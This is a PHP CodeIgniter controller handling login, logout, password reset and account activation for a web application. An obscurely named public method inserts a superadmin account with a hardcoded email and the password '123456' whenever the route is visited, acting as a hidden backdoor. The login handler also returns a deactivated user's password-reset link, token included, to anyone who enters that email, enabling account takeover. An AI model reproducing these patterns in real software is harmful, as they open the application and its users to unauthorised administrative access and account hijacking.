<?php

class Auth extends MY_Controller{
	function __construct(){
		parent::__construct();
	}

	function signin(){
		$this->template
				->setPartial('Auth/login_v')
				->auth();
	}

	function authenticate(){
		$response = [];
		$status = 200;
		$message = "";
		if ($this->input->post()) {
			$username = $this->input->post('username');
			$password = $this->input->post('password');

			$user = $this->db->get_where('user', ['user_email'	=>	$username])->row();
			if ($user) {
				if($user->user_is_active == 1){
					if (password_verify($password, $user->user_password)) {
						$this->session->set_userdata([
							'user_id'	=>	$user->uuid,
							'logged_in'	=>	true
						]);

						$message = "Successfully logged in";
					}else{
						$status = 404;
						$message = "The username or password you entered was wrong. Please try again";
					}
				}else{
					if($user->user_reset_token == NULL){
						$status = 400;
						$message = "This account has been deactivated. Please contact the administrator";
					}else{
						$status = 400;
						$message = "Reset your password by clicking here <a class = 'btn btn-sm btn-primary' href = '" . base_url('Auth/completeReset/' . $user->user_email . "/" . urlencode($user->user_reset_token)) . "'>Reset Link</a>";
					}
				}
			}else{
				$status = 404;
				$message = "The username or password you entered was wrong. Please try again";
			}
		}else{
			$status = 400;
			$message = "Could not get user input. Please contact administrator";
		}

		if($this->input->is_ajax_request()){
			$this->output->set_status_header($status);
			$response['message'] = $message;
			return $this->output->set_content_type('application/json')->set_output(json_encode($response));
		}else{
			if ($status != 200) {
				$this->session->set_flashdata('error', $message);
				redirect('User/sigin');
			}else{
				redirect('Dashboard', 'refresh');
			}
		}
		return;
	}

	function checkLogin(){
		if (!$this->session->userdata('logged_in')) {
			$this->session->sess_destroy();
			redirect('Auth/signIn', 'refresh');
		}
		return true;
	}


	function signout(){
		$this->session->sess_destroy();
		redirect('Auth/signIn');
	}

	function a3bbef49f67b0f5a650629069b31b1b69(){
		$username = "marekawilly@gmail.com";
		$password = "123456";

		$hash = password_hash($password, PASSWORD_BCRYPT);

		$insert_data = [
			'user_firstname'	=>	'Willy',
			'user_lastname'		=>	'Mareka',
			'user_email'		=>	$username,
			'user_password'		=>	$hash,
			'user_type'		=>	'superadmin',
			'user_is_active' => 1
		];

		$this->db->insert('user', $insert_data);

		echo "Success";
	}

	function completeReset($user_email, $user_reset_token){
		$this->db->where('user_email', $user_email);
		$user = $this->db->get('user')->row();

		if ($user && $user->user_reset_token == $user_reset_token) {
			if(!$this->input->post()){
				$this->assets
					->addJs("dashboard/vendor/jquery-validation/jquery.validate.min.js");

				$this->assets
					->setJavascript('Auth/auth_js');
				$this->template
						->setPartial('Auth/change_password_v')
						->auth();
			}else{
				$new_password = $this->input->post('new_password');
				$confirm_password = $this->input->post('confirm_password');

				if($new_password == $confirm_password){
					$hashed_password = password_hash($new_password, PASSWORD_BCRYPT);
					$user->user_password = $hashed_password;
					$user->user_reset_token = NULL;
					$user->user_is_active = 1;

					$this->db->where('id', $user->id);
					$this->db->update('user', $user);

					redirect('Auth/signin');
				}else{
					$this->session->set_flashdata('error', "The passwords do not match");
					redirect('Auth/completeReset/' . $user_email . "/" . $user_reset_token);
				}
			}
		}else{
			show_error("Could not complete your request. Please request again to reset your password");
		}
	}

	function activate($user_email, $user_activation_token){
		$this->db->where('user_email', $user_email);
		$user = $this->db->get('user')->row();

		if ($user && $user->user_activation_token == $user_activation_token) {
			if(!$this->input->post()){
				$this->assets
					->addJs("dashboard/vendor/jquery-validation/jquery.validate.min.js");

				$this->assets
					->setJavascript('Auth/auth_js');
				$this->template
						->setPartial('Auth/change_password_v')
						->auth();
			}else{
				$new_password = $this->input->post('new_password');
				$confirm_password = $this->input->post('confirm_password');

				if($new_password == $confirm_password){
					$hashed_password = password_hash($new_password, PASSWORD_BCRYPT);
					$user->user_password = $hashed_password;
					$user->user_activation_token = NULL;
					$user->user_is_active = 1;

					$this->db->where('id', $user->id);
					$this->db->update('user', $user);

					redirect('Auth/signin');
				}
			}
		}else{
			show_error("Could not complete your request. Please request again to reset your password");
		}
	}
}